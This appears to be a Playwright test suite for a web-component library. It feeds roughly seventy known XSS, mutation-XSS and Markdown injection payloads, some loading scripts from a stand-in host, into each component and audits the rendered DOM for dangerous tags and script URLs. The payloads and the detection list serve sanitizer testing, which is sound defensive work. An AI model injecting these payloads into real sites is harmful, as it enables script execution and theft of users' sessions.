/**
 * XSS test suite.
 *
 * Runs on a page WITHOUT any CSP, so a sanitizer failure would really execute.
 * `alert`, `confirm`, `prompt` and `print` are replaced by traps, and every payload
 * that can run code sets `window.__xss`.
 *
 * Payloads: OWASP XSS Filter Evasion Cheat Sheet, known mutation-XSS (mXSS) vectors,
 * and Markdown-specific vectors.
 */
import { expect, test } from '@playwright/test';
import { NO_CSP, mount } from '../e2e/helpers.js';

const PAYLOADS = [
  // Script injection
  '<script>alert(1)</script>',
  '<SCRIPT SRC=https://xss.example/xss.js></SCRIPT>',
  '<script>window.__xss=1</script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '"><script>alert(1)</script>',
  '</textarea><script>alert(1)</script>',
  '</title><script>alert(1)</script>',
  // Event handlers
  '<img src=x onerror=alert(1)>',
  '<IMG SRC=x onerror="javascript:alert(1)">',
  '<img src=x:alert(alt) onerror=eval(src) alt=0>',
  '<img/src=x/onerror=alert(1)>',
  '<img src="x"onerror="alert(1)">',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<body onload=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<select autofocus onfocus=alert(1)>',
  '<textarea autofocus onfocus=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<video><source onerror=alert(1)>',
  '<audio src=x onerror=alert(1)>',
  '<div onmouseover="alert(1)">hover</div>',
  '<a onmouseover=alert(1)>x</a>',
  '<object data="javascript:alert(1)">',
  '<embed src="javascript:alert(1)">',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>parent.__xss=1</script>"></iframe>',
  '<form><button formaction=javascript:alert(1)>x</button></form>',
  '<isindex type=image src=1 onerror=alert(1)>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  // URL schemes
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href=" &#14;  javascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<img src="javascript:alert(1)">',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<a xlink:href="javascript:alert(1)">x</a>',
  // Styles, meta, base
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<style>@import "https://xss.example/x.css";</style>',
  '<link rel=stylesheet href=https://xss.example/x.css>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<base href="javascript:alert(1)//">',
  // mXSS / parser confusion
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
  '<math><mi><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<a href="https://ok.example" id="x"><img name="body"></a><form id="document"></form>',
  '<template><script>alert(1)</script></template>',
  '<!--<img src=x onerror=alert(1)>-->',
  '<![CDATA[<script>alert(1)</script>]]>',
  // Markdown-specific
  '[x](javascript:alert(1))',
  '[x](JAVASCRIPT:alert(1))',
  '[x](javascript&#58;alert(1))',
  '[x](<javascript:alert(1)>)',
  '[x]( javascript:alert(1))',
  '[x](data:text/html,<script>alert(1)</script>)',
  '![x](javascript:alert(1))',
  '![x"onerror="alert(1)](x)',
  '[x](https://ok.example "title" onclick="alert(1)")',
  '<javascript:alert(1)>',
  '[ref]\n\n[ref]: javascript:alert(1)',
  '```html\n<script>alert(1)</script>\n```',
  '`<img src=x onerror=alert(1)>`',
  '> <img src=x onerror=alert(1)>',
  '| a |\n|---|\n| <img src=x onerror=alert(1)> |',
  '- [x] <img src=x onerror=alert(1)>',
];

const MODES = [
  {
    tag: 'vt-faq',
    attrs: { variant: 'full', open: 'all' },
    wrap: (p) => JSON.stringify([{ question: p, answer: p, category: p, id: p }]),
  },
  {
    tag: 'vt-gallery',
    attrs: { variant: 'full' },
    wrap: (p) => JSON.stringify([{ src: p, thumb: p, alt: p, caption: p, href: p }, p]),
  },
  {
    tag: 'vt-stats',
    attrs: { variant: 'full' },
    wrap: (p) =>
      JSON.stringify([
        {
          label: p,
          value: p,
          unit: p,
          against: p,
          description: p,
          url: p,
          series: [{ label: p, value: 1 }, 2],
        },
      ]),
  },
  {
    tag: 'vt-board',
    attrs: { variant: 'full', views: '' },
    wrap: (p) =>
      JSON.stringify({
        columns: [{ id: p, title: p, limit: 1 }],
        tasks: [
          {
            id: p,
            title: p,
            description: p,
            column: p,
            labels: [p],
            assignee: p,
            due: p,
            url: p,
            when: p,
          },
        ],
      }),
  },
  {
    tag: 'vt-board',
    attrs: { readonly: '', view: 'table' },
    wrap: (p) => JSON.stringify([{ title: p, status: p, url: p, labels: [p] }]),
  },
  {
    tag: 'vt-field',
    attrs: { type: 'multiselect', open: '' },
    wrap: (p) => JSON.stringify([{ value: p, label: p, description: p, group: p }, p]),
  },
  {
    tag: 'vt-field',
    attrs: { type: 'radio' },
    wrap: (p) =>
      JSON.stringify({
        label: p,
        hint: p,
        tip: p,
        prefix: p,
        suffix: p,
        error: p,
        placeholder: p,
        options: [p],
      }),
    data: true,
  },
  {
    tag: 'vt-date-picker',
    attrs: { mode: 'range', inline: '' },
    wrap: (p) =>
      JSON.stringify({
        label: p,
        hint: p,
        placeholder: p,
        value: p,
        min: p,
        max: p,
        presets: p,
        disabledDates: [p],
      }),
    data: true,
  },
  {
    tag: 'vt-menu',
    attrs: { trigger: 'inline' },
    wrap: (p) =>
      JSON.stringify([
        { label: p, description: p, shortcut: p, icon: p, href: p, id: p },
        { type: 'radio', label: p, group: p, items: [{ label: p, value: p }] },
        { label: p, items: [p] },
      ]),
  },
  {
    tag: 'vt-upload',
    attrs: { multiple: '' },
    wrap: (p) =>
      JSON.stringify({ label: p, hint: p, accept: p, maxSize: p, uploadUrl: p, uploadField: p }),
    data: true,
  },
  {
    tag: 'vt-search',
    attrs: { layout: 'inline', 'url-template': '/x/{id}' },
    wrap: (p) =>
      JSON.stringify([
        { id: p, title: p, section: p, content: p, url: p, keywords: [p], featured: true },
      ]),
  },
  {
    tag: 'vt-testimonials',
    attrs: { variant: 'full' },
    wrap: (p) =>
      JSON.stringify([{ quote: p, author: p, role: p, company: p, avatar: p, url: p, rating: 3 }]),
  },
  {
    tag: 'vt-countdown',
    attrs: { variant: 'full', now: '2026-11-07T12:00:00Z' },
    wrap: (p) =>
      JSON.stringify({ to: '2027-01-01T00:00:00Z', title: p, description: p, url: p, cta: p }),
  },
  {
    tag: 'vt-code',
    attrs: { variant: 'full' },
    wrap: (p) => JSON.stringify({ code: p, language: p, label: p }),
    data: true,
  },
  {
    tag: 'vt-status',
    attrs: { variant: 'full', now: '2026-11-05T12:00:00Z' },
    wrap: (p) =>
      JSON.stringify({
        message: p,
        components: [
          {
            name: p,
            description: p,
            group: p,
            url: p,
            status: p,
            since: '2026-11-01',
            history: [{ date: '2026-11-02', status: 'major', note: p }],
          },
        ],
        incidents: [
          {
            title: p,
            status: p,
            impact: p,
            url: p,
            components: [p],
            updates: [{ status: p, text: p }],
          },
        ],
        maintenances: [{ title: p, status: p, url: p }],
      }),
  },
  {
    tag: 'vt-calendar',
    attrs: {
      variant: 'full',
      view: 'agenda',
      date: '2026-11-01',
      now: '2026-11-05T12:00:00Z',
      timezone: 'UTC',
    },
    wrap: (p) =>
      JSON.stringify([
        { title: p, description: p, location: p, url: p, categories: [p], start: '2026-11-05' },
      ]),
  },
  {
    tag: 'vt-calendar',
    attrs: { date: '2026-11', now: '2026-11-05T12:00:00Z', timezone: 'UTC' },
    wrap: (p) => {
      const line = p.replace(/\n/g, ' ');
      return [
        'BEGIN:VCALENDAR',
        'BEGIN:VEVENT',
        `SUMMARY:${line}`,
        `DESCRIPTION:${line}`,
        `LOCATION:${line}`,
        `URL:${line}`,
        'DTSTART:20261105T100000Z',
        'END:VEVENT',
        'END:VCALENDAR',
      ].join('\n');
    },
  },
  {
    tag: 'vt-pricing',
    attrs: { variant: 'full' },
    wrap: (p) =>
      JSON.stringify({
        periods: [{ id: p, label: p, note: p }],
        currency: p,
        plans: [
          {
            id: p,
            name: p,
            description: p,
            badge: p,
            unit: p,
            price: p,
            cta: { label: p, url: p },
            features: [p],
          },
        ],
        compare: [{ name: p, group: p, description: p, values: { [p]: p } }],
        note: p,
      }),
  },
  { tag: 'vt-markdown', attrs: {} },
  { tag: 'vt-markdown', attrs: { 'allow-html': '' } },
  { tag: 'vt-markdown', attrs: { 'allow-html': '', variant: 'full', 'default-tab': 'split' } },
  { tag: 'vt-code', attrs: { language: 'html', variant: 'full' } },
  { tag: 'vt-code', attrs: { language: 'markdown' } },
  {
    tag: 'vt-json',
    attrs: { variant: 'full', depth: '5' },
    wrap: (p) => JSON.stringify({ [p]: [p, { p }] }),
  },
  { tag: 'vt-json', attrs: { view: 'raw' }, wrap: (p) => JSON.stringify({ p }) },
  { tag: 'vt-json', attrs: {}, wrap: (p) => p }, // invalid JSON path
  {
    tag: 'vt-csv',
    attrs: { variant: 'full' },
    wrap: (p) => `name,value\n"${p.replace(/"/g, '""')}",${p.length}`,
  },
  {
    tag: 'vt-tags',
    attrs: { counts: '', clickable: '' },
    wrap: (p) => JSON.stringify([p, { value: p, href: p, color: p, kind: p }]),
  },
  {
    tag: 'vt-tags',
    attrs: { mode: 'edit', variant: 'full' },
    wrap: (p) => JSON.stringify({ value: [p], options: [{ value: p, description: p, group: p }] }),
  },
  {
    tag: 'vt-diff',
    attrs: { variant: 'full' },
    wrap: (p) => `--- a\n+++ b\n@@ -1 +1 @@\n-${p.replace(/\n/g, ' ')}\n+${p.replace(/\n/g, ' ')}!`,
  },
  {
    tag: 'vt-terminal',
    attrs: { variant: 'full', escapes: '' },
    // As a command, as colored output, and as the URL and text of an OSC 8 link.
    wrap: (p) =>
      `$ ${p.replace(/\n/g, ' ')}\n\\e[31m${p}\\e[0m\n\\e]8;;${p.replace(/\s/g, '')}\\e\\\\${p}\\e]8;;\\e\\\\`,
  },
  {
    tag: 'vt-tree',
    attrs: { variant: 'full', 'href-template': 'https://example.com/{path}' },
    wrap: (p) => JSON.stringify([{ name: p, children: [{ name: p, note: p, status: 'added' }] }]),
  },
  {
    tag: 'vt-tree',
    attrs: { 'href-template': 'javascript:alert(1)//{name}' },
    wrap: (p) =>
      `${p.replace(/\n/g, ' ')}/\n  ${p.replace(/\n/g, ' ')}  # ${p.replace(/\n/g, ' ')}`,
  },
  {
    tag: 'vt-http',
    attrs: { variant: 'full', layout: 'columns' },
    wrap: (p) =>
      JSON.stringify({
        request: { method: 'POST', url: `/a?q=${p}`, headers: { 'X-Test': p }, body: p },
        response: { status: 200, headers: { 'Content-Type': 'text/html' }, body: p },
      }),
  },
  {
    tag: 'vt-http',
    attrs: { variant: 'full', view: 'code' },
    wrap: (p) =>
      JSON.stringify({ request: { method: 'POST', url: `https://x.dev/${p}`, body: p } }),
  },
  {
    tag: 'vt-sql',
    attrs: { variant: 'full' },
    wrap: (p) =>
      JSON.stringify({
        query: p,
        params: [p, { [p]: p }],
        columns: [p, { name: p, type: p }],
        rows: [[p, p], { [p]: p }],
        message: p,
        error: p,
      }),
  },
  {
    tag: 'vt-sql',
    attrs: { format: '' },
    wrap: (p) => `app=# SELECT '${p}';\n ${p} | b\n----+---\n ${p} | 2\n(1 row)\nERROR:  ${p}`,
  },
  {
    tag: 'vt-test-report',
    attrs: { variant: 'full', open: 'all' },
    wrap: (p) =>
      JSON.stringify([
        { name: p, suite: p, classname: p, status: 'failed', message: p, details: p, output: p },
        { name: p, suite: p, status: p },
      ]),
  },
  {
    tag: 'vt-test-report',
    attrs: { open: 'all' },
    wrap: (p) => {
      const x = p.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
      return `<testsuites name="${x}"><testsuite name="${x}" file="${x}"><testcase name="${x}" classname="${x}"><failure message="${x}" type="${x}">${x}</failure><system-out>${x}</system-out></testcase></testsuite></testsuites>`;
    },
  },
  {
    tag: 'vt-trace',
    attrs: { variant: 'full', selected: 'a' },
    wrap: (p) =>
      JSON.stringify([
        { id: 'a', name: p, service: p, kind: p, start: 0, duration: 5, attributes: { [p]: p }, error: p, events: [{ name: p, time: 1 }] }, // prettier-ignore
        { id: p, parent: 'a', name: p, service: p, start: 1, duration: 2 },
      ]),
  },
  {
    tag: 'vt-notebook',
    attrs: { variant: 'full' },
    wrap: (p) =>
      JSON.stringify({
        metadata: { kernelspec: { display_name: p }, language_info: { name: p } },
        cells: [
          { cell_type: 'markdown', source: p, attachments: { [p]: { 'image/png': p } } },
          { cell_type: 'raw', source: p },
          {
            cell_type: 'code',
            source: p,
            outputs: [
              { output_type: 'stream', name: 'stdout', text: p },
              { output_type: 'display_data', data: { 'text/html': p, 'text/plain': p } },
              { output_type: 'display_data', data: { 'text/markdown': p } },
              { output_type: 'display_data', data: { 'image/png': p, 'text/plain': p } },
              { output_type: 'execute_result', data: { 'application/json': p } },
              { output_type: 'error', ename: p, evalue: p, traceback: [p] },
            ],
          },
        ],
      }),
  },
  {
    tag: 'vt-pivot',
    attrs: { variant: 'full', columns: 'b', heat: '' },
    wrap: (p) =>
      JSON.stringify([
        { a: p, b: p, n: 1, [p]: p },
        { a: 'x', b: p, n: 2 },
      ]),
  },
  {
    tag: 'vt-heatmap',
    attrs: { variant: 'full', unit: '<b>u</b>' },
    wrap: (p) =>
      JSON.stringify([
        { x: p, y: p, value: 1 },
        { x: 'a', y: p, value: 2 },
      ]),
  },
  {
    tag: 'vt-flame',
    attrs: { variant: 'full' },
    wrap: (p) => `main;${p.replace(/[;\n]/g, ' ')};leaf 10\nmain 2`,
  },
  {
    tag: 'vt-math',
    attrs: { delimiters: '', variant: 'full' },
    wrap: (p) =>
      `Text ${p} then $${p}$ and $$\\text{${p}}$$ and \\(\\href{javascript:alert(1)}{x}\\)`,
  },
];

/** Inspects every shadow root for dangerous markup. Runs in the page. */
function audit() {
  const problems = [];
  const DANGEROUS_TAGS = new Set([
    'script',
    'iframe',
    'object',
    'embed',
    'style',
    'form',
    'svg',
    'math',
    'base',
    'meta',
    'link',
    'frame',
    'frameset',
    'textarea',
    'select',
    'button',
    'video',
    'audio',
    'source',
    'template',
  ]);
  const URL_ATTRS = ['href', 'src', 'action', 'formaction', 'xlink:href', 'srcdoc', 'data'];
  const visit = (root) => {
    for (const el of root.querySelectorAll('*')) {
      const tag = el.localName;
      // Vitrine's own UI uses <button> and an inline <svg> icon set: only flag them in content areas.
      // Vitrine's own controls (copy buttons on code blocks) may sit inside content: the
      // sanitizer strips every class except language-*, so content can never forge `.btn`.
      const ownUi = el.closest('.btn');
      const inContent =
        !ownUi && el.closest('.markdown, .content, .tree [part="value"], .tree [part="key"]');
      if (inContent && DANGEROUS_TAGS.has(tag)) problems.push(`<${tag}> in content`);
      for (const attr of el.attributes) {
        if (/^on/i.test(attr.name)) problems.push(`${tag}[${attr.name}]`);
        if (attr.name === 'style' && inContent) problems.push(`${tag}[style] in content`);
        if (URL_ATTRS.includes(attr.name)) {
          // eslint-disable-next-line no-control-regex -- strips C0 controls like browsers do
          const value = attr.value.replace(/[\u0000- ]/g, '').toLowerCase();
          if (/^(javascript|vbscript|data:(?!image\/(png|gif|jpe?g|webp|avif);))/.test(value))
            problems.push(`${tag}[${attr.name}=${attr.value}]`);
        }
      }
      if (el.shadowRoot) visit(el.shadowRoot);
    }
  };
  visit(document);
  return problems;
}

test.describe('XSS payloads', () => {
  test.beforeEach(async ({ page }) => {
    await page.addInitScript(() => {
      const trap = () => {
        window.__xss = true;
      };
      window.alert = trap;
      window.confirm = trap;
      window.prompt = trap;
      window.print = trap;
    });
    await page.goto(NO_CSP);
  });

  for (const [modeIndex, mode] of MODES.entries()) {
    test(`${mode.tag} ${JSON.stringify(mode.attrs)} (#${modeIndex}) neutralizes every payload`, async ({
      page,
    }) => {
      for (const payload of PAYLOADS) {
        const content = mode.wrap ? mode.wrap(payload) : payload;
        // `data` modes go through the json attribute, so the JSON layer is tested too.
        if (mode.data) await mount(page, mode.tag, { ...mode.attrs, json: content });
        else await mount(page, mode.tag, mode.attrs, content);
        // Exercise interactive paths too: hover, focus and the search bar.
        await page.locator('#el').hover();
        await page.waitForTimeout(30);
        const problems = await page.evaluate(audit);
        expect(problems, `payload: ${payload}`).toEqual([]);
      }
      await page.waitForTimeout(300);
      expect(await page.evaluate(() => window.__xss), 'a payload executed').toBeUndefined();
    });
  }

  test('label and title attributes are rendered as text', async ({ page }) => {
    for (const payload of PAYLOADS.slice(0, 20)) {
      await mount(page, 'vt-code', { variant: 'full', label: payload }, 'x');
      await expect(page.locator('#el [part="title"]')).toHaveText(
        payload.replace(/\s+/g, ' ').trim().slice(0, 200),
      );
    }
    expect(await page.evaluate(audit)).toEqual([]);
    expect(await page.evaluate(() => window.__xss)).toBeUndefined();
  });

  test('search queries are never interpreted as markup', async ({ page }) => {
    await mount(page, 'vt-code', { variant: 'full' }, '<img src=x onerror=alert(1)>');
    await page.locator('#el').getByRole('button', { name: 'Search' }).click();
    await page.locator('#el').getByRole('searchbox').fill('<img src=x onerror=alert(1)>');
    await expect(page.locator('#el [part="search-count"]')).toHaveText('1 / 1');
    expect(await page.evaluate(audit)).toEqual([]);
    expect(await page.evaluate(() => window.__xss)).toBeUndefined();
  });

  test('render() ignores event handler options', async ({ page }) => {
    await page.evaluate(() =>
      window.Vitrine.render(document.getElementById('root'), {
        type: 'code',
        content: 'x',
        options: { onclick: 'alert(1)', onMouseOver: 'alert(1)', label: '<b>x</b>' },
      }),
    );
    const el = page.locator('vt-code');
    expect(await el.getAttribute('onclick')).toBe(null);
    expect(await el.getAttribute('onmouseover')).toBe(null);
    await el.click();
    await el.hover();
    expect(await page.evaluate(() => window.__xss)).toBeUndefined();
    // Vitrine's own attributes starting with "on" still work (they contain a dash).
    await page.evaluate(() =>
      window.Vitrine.render(document.getElementById('root'), {
        type: 'json',
        content: '{',
        options: { onInvalid: 'raw' },
      }),
    );
    expect(await page.locator('vt-json').getAttribute('on-invalid')).toBe('raw');
  });
});

test.describe('Network side channels', () => {
  test('blocked images are never requested', async ({ page }) => {
    const requests = [];
    page.on('request', (r) => requests.push(r.url()));
    await page.goto(NO_CSP);
    for (const images of ['block', 'same-origin']) {
      await mount(
        page,
        'vt-markdown',
        { images, 'allow-html': '' },
        '![a](https://tracker.example/a.png) <img src="https://tracker.example/b.png">',
      );
    }
    await page.waitForTimeout(300);
    expect(requests.filter((url) => url.includes('tracker.example'))).toEqual([]);
  });

  test('content of vt-code and vt-json never triggers requests', async ({ page }) => {
    const requests = [];
    page.on('request', (r) => requests.push(r.url()));
    await page.goto(NO_CSP);
    const before = requests.length;
    const payload =
      '<img src="https://tracker.example/c.png"><link rel=stylesheet href="https://tracker.example/d.css">';
    await mount(page, 'vt-code', { language: 'html' }, payload);
    await mount(page, 'vt-json', { variant: 'full' }, JSON.stringify({ payload }));
    await page.waitForTimeout(300);
    expect(requests.slice(before).filter((url) => url.includes('tracker.example'))).toEqual([]);
  });
});
